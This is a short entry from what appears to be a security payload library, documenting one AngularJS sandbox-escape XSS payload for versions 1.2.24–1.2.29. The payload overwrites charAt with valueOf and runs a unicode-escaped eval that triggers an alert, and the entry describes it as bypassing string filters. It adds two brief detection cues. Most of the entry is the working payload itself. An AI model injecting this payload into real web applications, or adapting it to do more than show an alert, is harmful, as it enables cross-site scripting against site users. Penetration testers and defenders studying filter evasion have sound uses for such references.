---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - encoded-eval
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-CharAt-ValueOf-Encoded-Eval

## Code

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

## Description

Overwrites charAt with valueOf and uses unicode-escaped conditional eval to trigger alert(1) in AngularJS 1.2.24-1.2.29.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Escaped for filter evasion. | N/A |

## Usage

Bypasses string filters with unicode.

## Detection

- Unicode escapes in inputs.
- Conditional window checks.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
